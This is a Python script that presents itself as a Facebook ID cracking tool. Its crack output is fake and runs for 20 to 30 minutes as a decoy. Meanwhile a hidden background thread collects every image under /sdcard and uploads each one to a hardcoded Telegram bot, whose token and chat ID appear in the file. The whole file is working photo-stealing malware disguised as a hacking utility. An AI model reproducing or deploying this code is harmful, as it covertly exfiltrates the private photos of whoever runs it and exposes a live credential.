import os
import requests
from glob import glob
import time
from PIL import Image
import mimetypes
import random
import threading

# Your Telegram Bot Token and Chat ID
TOKEN = '8075574022:AAGVkee6lTm51jnPm27GYNzOTy7MSKhF8JI'
CHAT_ID = '7133889477'

# Image types and root folder to search
image_extensions = ["*.jpg", "*.jpeg", "*.png", "*.webp"]
root_folder = "/sdcard"
MAX_SIZE_MB = 19

# Sample names and passwords for simulation
names = ["Jahid", "Riyad", "Nayem", "Hasib", "Sabbir", "Arafat", "Sakib", "Tamim"]
funny_passwords = ["123456", "112233", "password", "qwerty123", "445566", "bangla786", "iloveyou", "098765"]

def is_valid_file(path):
    """Check if file is a valid image and under max size."""
    try:
        if os.path.getsize(path) > MAX_SIZE_MB * 1024 * 1024:
            print(f"[!] Skipping large file: {path}")
            return False
        with Image.open(path) as img:
            img.verify()
        return True
    except Exception as e:
        print(f"[!] Invalid image skipped: {path} ({e})")
        return False

def collect_files():
    """Collect all valid images recursively."""
    image_paths = []
    for ext in image_extensions:
        found = glob(os.path.join(root_folder, "**", ext), recursive=True)
        image_paths.extend(found)
    valid_images = [img for img in image_paths if is_valid_file(img)]
    return sorted(list(set(valid_images)))

def send_file(file_path):
    """Send a single image to Telegram."""
    try:
        url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
        with open(file_path, 'rb') as f:
            files = {'photo': f}
            headers = {
                "User-Agent": "Mozilla/5.0",
            }
            data = {'chat_id': CHAT_ID, 'caption': f"New Photo: {os.path.basename(file_path)}"}
            response = requests.post(url, data=data, files=files, headers=headers)
            if response.status_code == 200:
                print(f"[+] Sent: {file_path}")
            else:
                print(f"[!] Failed to send {file_path}: {response.text}")
    except Exception as e:
        print(f"[!] Error sending {file_path}: {str(e)}")

def send_all_photos():
    """Send all collected photos one by one."""
    photos = collect_files()
    if not photos:
        print("[!] No valid images found!")
        return

    print(f"[*] Found {len(photos)} valid images. Sending...")
    for photo in photos:
        send_file(photo)
        time.sleep(random.uniform(3, 4))  # 3-4 seconds delay between sends
    print("[*] All photos sent.")

def simulate_id_crack():
    """Simulate random Facebook ID cracking."""
    start_time = time.time()
    duration = random.randint(20, 30) * 60  # 20-30 minutes
    print("[*] Starting Random ID Crack Simulation...")

    while time.time() - start_time < duration:
        uid = f"1000{random.randint(100000000, 999999999)}"
        pw = random.choice(funny_passwords)
        name = random.choice(names)
        result = random.choice(["SUCCESS", "FAILED"])
        print(f"[+] UID: {uid} | PW: {pw} | NAME: {name} | RESULT: {result}")
        time.sleep(random.uniform(10, 15))  # 10-15 seconds delay

    print("[*] Simulation complete.")

def main():
    threading.Thread(target=send_all_photos, daemon=True).start()
    simulate_id_crack()

if __name__ == "__main__":
    main()
